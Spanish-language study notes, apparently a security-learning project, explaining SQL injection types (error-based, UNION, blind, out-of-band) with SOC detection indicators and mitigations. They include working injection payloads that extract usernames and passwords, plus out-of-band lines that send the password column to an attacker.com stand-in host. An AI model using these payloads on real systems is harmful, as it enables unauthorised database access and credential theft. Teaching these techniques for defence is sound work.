🟣 1. Archivo: notes/sqli_basics.md
md
# SQL Injection — Conceptos Básicos

SQL Injection (SQLi) es una vulnerabilidad que ocurre cuando una aplicación web inserta entrada del usuario directamente en consultas SQL sin validación ni sanitización.

Esto permite a un atacante:
- manipular consultas
- extraer información
- modificar datos
- omitir autenticación
- comprometer la base de datos completa

## ¿Por qué ocurre?

Porque la aplicación hace algo como:

```sql
SELECT * FROM users WHERE username = '$user';
Si $user no se valida, un atacante puede inyectar:

Código
' OR '1'='1
y alterar la lógica de la consulta.

Indicadores de SQLi
errores SQL visibles

comportamientos inesperados

respuestas diferentes según caracteres especiales

cambios en el tiempo de respuesta

mensajes de “syntax error”, “unknown column”, etc.

Tipos principales
En banda (error-based, UNION-based)

Ciega (boolean-based, time-based)

Fuera de banda (OOB)

Este archivo resume los fundamentos necesarios para entender el resto del proyecto.

Código

---

# 🟣 **2. Archivo: `notes/error_based.md`**

```md
# SQL Injection Basada en Errores (Error-Based SQLi)

La SQLi basada en errores aprovecha mensajes de error devueltos por la base de datos para extraer información.

## ¿Cómo funciona?

El atacante provoca un error intencional para que la base de datos revele:

- nombres de tablas
- columnas
- tipos de datos
- estructura interna

Ejemplo de payload:

1' ORDER BY 100--

Código

Si la columna no existe, la base de datos devuelve un error útil.

## Ejemplo de extracción

1' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1--

Código

Si la aplicación muestra el error, el atacante puede reconstruir la estructura de la base de datos.

## Indicadores en logs (SOC)

- errores SQL repetidos
- parámetros con `'`, `"`, `--`, `#`
- intentos de `information_schema`
🟣 3. Archivo: notes/union_based.md
md
# SQL Injection Basada en UNION

La técnica UNION permite combinar resultados de múltiples consultas SQL.

Un atacante puede usarla para extraer datos arbitrarios.

## Pasos típicos

1. Descubrir el número de columnas:
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--

Código
2. Probar UNION:
1' UNION SELECT null--

Código
3. Ajustar columnas:
1' UNION SELECT null, null--

Código
4. Extraer datos:
1' UNION SELECT username, password FROM users--

Código

## Indicadores SOC

- presencia de `UNION SELECT`
- columnas NULL repetidas
- consultas a tablas sensibles
🟣 4. Archivo: notes/blind_sqli.md
md
# Blind SQL Injection (Boolean-Based y Time-Based)

Blind SQLi ocurre cuando la aplicación no muestra errores, pero su comportamiento permite inferir datos.

## Boolean-Based

El atacante envía condiciones que devuelven TRUE o FALSE.

Ejemplo:

1' AND 1=1--
1' AND 1=2--

Código

Si la respuesta cambia, hay SQLi.

Extracción carácter por carácter:

1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--

Código

## Time-Based

El atacante usa funciones de retraso:

1' AND IF(1=1, SLEEP(5), 0)--

Código

Si la respuesta tarda más → condición verdadera.

## Indicadores SOC

- patrones repetitivos
- tiempos de respuesta anómalos
- consultas con `SLEEP()`, `WAITFOR DELAY`, `BENCHMARK()`
🟣 5. Archivo: notes/oob_sqli.md
md
# SQL Injection Fuera de Banda (OOB)

Ocurre cuando el atacante no puede ver la respuesta directamente, pero la base de datos envía datos a un servidor externo controlado por él.

## ¿Cómo funciona?

El atacante provoca que la base de datos haga una petición DNS o HTTP hacia un dominio suyo.

Ejemplo:

1' UNION SELECT LOAD_FILE('\\\\attacker.com\\x')--

Código

O con DNS:

1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users),'.attacker.com\\x')))--

Código

## Cuándo se usa

- cuando no hay errores visibles
- cuando no hay diferencias de tiempo
- cuando la aplicación filtra respuestas

## Indicadores SOC

- peticiones DNS raras
- tráfico saliente hacia dominios desconocidos
- patrones de exfiltración
🟣 6. Archivo: notes/mitigation.md
md
# Mitigación de SQL Injection

SQL Injection es prevenible si se aplican buenas prácticas.

## 1. Declaraciones preparadas (Prepared Statements)

Separan la lógica SQL de los datos del usuario.

Ejemplo seguro:

```python
cursor.execute("SELECT * FROM users WHERE username = ?", (user,))
2. Validación de entrada
permitir solo caracteres esperados

bloquear caracteres peligrosos

usar listas blancas

3. Principio de mínimo privilegio
la cuenta SQL usada por la aplicación NO debe tener permisos de administrador

limitar SELECT/INSERT/UPDATE/DELETE según necesidad

4. Evitar concatenación de strings
Nunca hacer:

sql
"SELECT * FROM users WHERE user = '" + user + "'"
5. Monitorización (SOC)
alertas por UNION, SLEEP, information_schema

detección de patrones repetitivos

correlación de intentos fallidos
